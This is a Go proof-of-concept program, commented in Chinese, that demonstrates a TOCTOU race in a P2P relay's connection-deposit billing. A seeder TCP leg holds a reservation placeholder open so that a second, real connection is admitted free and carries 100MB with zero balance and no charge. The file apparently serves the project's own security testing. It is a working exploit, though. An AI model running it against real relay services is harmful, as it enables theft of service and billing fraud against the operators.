// Command billing-toctou-demo 演示【连接保证金 TOCTOU 竞态】的完整攻击链，并真正传输 100MB。
//
// 与 cmd/billingpoc-race（盲目 hammer，高并发反而打崩 dual-leg 握手）不同，本命令用
// 【seeder + real 两连接】的确定性打法，产出一条【健康的免费连接】承载完整字节流：
//
//	漏洞根因（admission_register.go onBusinessConnect）：占位符在 CA /reserve 之前就 Store，
//	free-pass 分支只要 Load 到未过期占位即 return nil 放行、从不核实扣费。
//
//	打法：
//	  1) seeder：用【单条裸 TCP leg】(TryConnectTCPOnlyStream) 朝入口 relay 送一条业务首帧
//	     (Header.NodeId=B, Payload=A 公钥)。relay 在 StreamOn【之前】调用 onBusinessConnect ——
//	     它 Store(A|B) 占位后【阻塞在延迟代理的 /reserve 上数秒】(本演示把窗口拉到数秒，忠实
//	     还原 CA 与 relay 分处两机的真实 RTT)。这条 leg 永远卡在 onBusinessConnect 里、从不
//	     StreamOn，因此【绝不碰 B 的 group】—— 它唯一作用就是把 (A|B) 占位挂住 depositWindow。
//	  2) real：窗口内 A→B 发一条真正的 Connect。它的【两条 dual-leg】都 Load 到 seeder 的占位 →
//	     都 free-pass → 这是一条【没有被拒 leg、握手干净】的正常双 leg 连接，只是从没付过费。
//	  3) 在 real 连接上把 100MB 推给 B（A→B = client_to_relay = 计量盲区，billing_hook.go:49
//	     仍只计 relay_to_clients）。SHA256 校验一致。
//	  4) seeder 的 /reserve 最终因 0 余额返回 Allow=false、关掉自己那条 leg —— 但此时 100MB
//	     早已传完。全程 CA 账本 0 扣费、0 credit。
//
// 约束合规：只用公开 /issue 免费领两张 0 余额证书；绝不调用 /credit。
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"time"

	"bnfs_p2p/admissioncli"
	"bnfs_p2p/crypoto"
	"bnfs_p2p/logx"
	"bnfs_p2p/networkFrameWork"
	"bnfs_p2p/p2pnode"
	"bnfs_p2p/p2pnode/impl/natnode"
)

func main() {
	caURL := flag.String("ca", "http://127.0.0.1:9000", "CA 地址（/issue + 余额查询）")
	relay := flag.String("relay", "127.0.0.1:9010", "index/relay 地址")
	sizeMB := flag.Int("size", 100, "传输大小(MB)")
	seedDelay := flag.Duration("seeddelay", 900*time.Millisecond, "seeder 起跑后、real 连接起跑前的等待（须 < CA /reserve 窗口）")
	flag.Parse()

	logx.SetLevel(logx.LevelWarn) // 压低框架日志，突出攻击链输出
	target := int64(*sizeMB) * 1024 * 1024
	const chunk = 256 * 1024

	fmt.Printf("=== 连接保证金 TOCTOU 完整攻击链 (判据2: 0 余额真传 %dMB) ===\n", *sizeMB)
	fmt.Printf("CA=%s relay=%s\n\n", *caURL, *relay)

	// —— 两个全新的 0 余额身份（只 /issue 领证，绝不 /credit）——
	skey, err := crypoto.MakeKeyPair()
	must("生成 B(server) 密钥", err)
	ckey, err := crypoto.MakeKeyPair()
	must("生成 A(client) 密钥", err)

	nodeB, err := natnode.NewNATNode(skey, *relay)
	must("创建 B(server)", err)
	must("B 申请 server 证书(0 余额)", admissioncli.SetupNat(nodeB, *caURL, admissioncli.RoleServer()))
	fmt.Printf("[B] server NodeID=%s (余额始终 0)\n", nodeB.ID())

	nodeA, err := natnode.NewNATNode(ckey, *relay)
	must("创建 A(client)", err)
	must("A 申请 client 证书(0 余额)", admissioncli.SetupNat(nodeA, *caURL, admissioncli.RoleClient()))
	fmt.Printf("[A] client NodeID=%s (余额始终 0)\n\n", nodeA.ID())

	cBefore := balanceOf(*caURL, string(nodeA.ID()))
	sBefore := balanceOf(*caURL, string(nodeB.ID()))
	fmt.Printf("[余额] 攻击前  client=%dB  server=%dB (均应为 0)\n", cBefore, sBefore)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// B 收满 target 字节并做增量 SHA256。
	done := make(chan string, 1)
	nodeB.OnConnection(func(conn p2pnode.Connection) {
		go func() {
			h := sha256.New()
			var got int64
			for got < target {
				msg, rerr := conn.Receive(ctx)
				if rerr != nil {
					fmt.Printf("[B] 接收中断 @%dB: %v\n", got, rerr)
					return
				}
				got += int64(len(msg.Payload))
				h.Write(msg.Payload)
				if got%(10*1024*1024) < chunk {
					fmt.Printf("[B] 已接收 %d MB (0 余额, 免费连接上, 未熔断)\n", got/1024/1024)
				}
			}
			select {
			case done <- hex.EncodeToString(h.Sum(nil)):
			default:
			}
		}()
	})

	go func() {
		if e := nodeB.Listen(ctx, *relay); e != nil {
			fmt.Printf("[B] Listen 退出: %v\n", e)
		}
	}()
	go func() {
		if e := nodeA.Listen(ctx, *relay); e != nil {
			fmt.Printf("[A] Listen 退出: %v\n", e)
		}
	}()
	time.Sleep(3 * time.Second)

	// —— 步骤 1: seeder（占位挂住 leg，单条裸 TCP，不 StreamOn）——
	//
	// 关键修正（相较旧 dual-leg seeder）：旧做法用 nodeA.Connect() 做 seeder，它是【完整
	// dual-leg】——其 follower leg 会在 relay 上 free-pass 并 StreamOn 到 B 的 group。B 的
	// group 按 nodeId 单键，seeder 与 real 两条连接的 leg 会在 B 的 accept 路径上互相顶掉，
	// 导致 real 握手超时（正是旧 demo 的 context deadline）。
	//
	// 新做法：seeder 用【单条裸 TCP leg】(TryConnectTCPOnlyStream) 直接朝入口 relay 发一条
	// 业务首帧(Header.NodeId=B, Payload=A 公钥, 新 connID)。relay 在 StreamOn【之前】调用
	// onBusinessConnect —— 它 Store(A|B) 占位后【阻塞在延迟代理的 /reserve 上数秒】。因此这条
	// leg 永远【卡在 onBusinessConnect 里、从不 StreamOn】，绝不碰 B 的 group。它唯一的作用
	// 就是把 (A|B) 占位在 reservedPairs 里挂住 depositWindow。
	fmt.Printf("\n[步骤1] seeder: 单条裸 leg 朝 relay 发业务首帧 → relay Store(A|B) 占位并阻塞在 /reserve...\n")
	aPubHex := nodeA.PubKeyHex()
	go func() {
		// 单条裸 TCP leg：不 dual、不握手、不 StreamOn，只把首帧送到 relay 触发 onBusinessConnect。
		s, _, derr := networkFrameWork.TryConnectTCPOnlyStream(*relay, string(nodeB.ID()), aPubHex)
		if derr != nil {
			fmt.Printf("[seeder] 裸 leg 拨号返回: %v（占位可能已挂住，忽略）\n", derr)
			return
		}
		// 让这条 leg 一直挂着（占位随之保持），直到主流程传输完成后 ctx 取消。
		<-ctx.Done()
		s.Close()
	}()

	// —— 步骤 2: real（真正承载 100MB 的免费连接）——
	// 窗口内起跑：real 的两条 dual-leg 都 Load 到 seeder 占位 → 都 free-pass → 干净握手。
	time.Sleep(*seedDelay)
	fmt.Printf("[步骤2] real A→B Connect：两条 leg 都命中 seeder 占位 → 免费放行 → 干净建连...\n")
	rctx, rcancel := context.WithTimeout(ctx, 20*time.Second)
	conn, err := nodeA.Connect(rctx, nodeB.ID())
	rcancel()
	must("real 连接（应免费建成）", err)
	fmt.Printf("[步骤2] ✅ real 连接建成（0 余额、未成功扣费即放行）\n")

	// —— 步骤 3: 推 100MB ——
	fmt.Printf("[步骤3] 在免费连接上推送 %dMB (A→B = client_to_relay 计量盲区)...\n\n", *sizeMB)
	payload := make([]byte, target)
	rand.New(rand.NewSource(42)).Read(payload)
	srcSHA := sha256.Sum256(payload)

	start := time.Now()
	for off := int64(0); off < target; off += chunk {
		end := off + chunk
		if end > target {
			end = target
		}
		if e := conn.Send(ctx, &p2pnode.Message{Payload: payload[off:end]}); e != nil {
			must("A 发送", e)
		}
	}
	fmt.Printf("[A] 发送完成, 耗时 %s\n", time.Since(start).Truncate(time.Millisecond))

	select {
	case dstSHA := <-done:
		cAfter := balanceOf(*caURL, string(nodeA.ID()))
		sAfter := balanceOf(*caURL, string(nodeB.ID()))
		fmt.Printf("\n=== 结果 ===\n")
		fmt.Printf("源 SHA256: %s\n收 SHA256: %s\n", hex.EncodeToString(srcSHA[:]), dstSHA)
		if dstSHA != hex.EncodeToString(srcSHA[:]) {
			fmt.Printf("SHA 校验: ❌ 不一致\n")
			os.Exit(1)
		}
		fmt.Printf("SHA 校验: ✅ 一致\n\n")
		fmt.Printf("[余额] 攻击后  client=%dB  server=%dB\n", cAfter, sAfter)
		spent := (cBefore - cAfter) + (sBefore - sAfter)
		fmt.Printf("[扣费] 合计 %dB (=%.4fMB)\n", spent, float64(spent)/1024/1024)
		if spent <= 0 {
			fmt.Printf("\n✅ 判据2 达成（0 成本）: TOCTOU 竞态下真实传输 %dMB、SHA 一致、CA 0 扣费、0 credit、未熔断。\n", *sizeMB)
		} else {
			fmt.Printf("\n⚠️ 有扣费 %dB：seeder 窗口没挂住(seeddelay 太大/窗口太小)，real 走了正常扣费路径。\n", spent)
		}
	case <-time.After(20 * time.Minute):
		fmt.Printf("超时\n")
		os.Exit(1)
	}
}

func must(what string, err error) {
	if err != nil {
		fmt.Printf("[FATAL] %s: %v\n", what, err)
		os.Exit(1)
	}
}

// balanceOf 查询 CA 账本余额（仅读，不涉及 /credit 分发余额）。
func balanceOf(caURL, nodeID string) int64 {
	resp, err := http.Get(caURL + "/balance?node=" + nodeID)
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var m map[string]int64
	if json.Unmarshal(body, &m) != nil {
		return -1
	}
	return m["balance"]
}
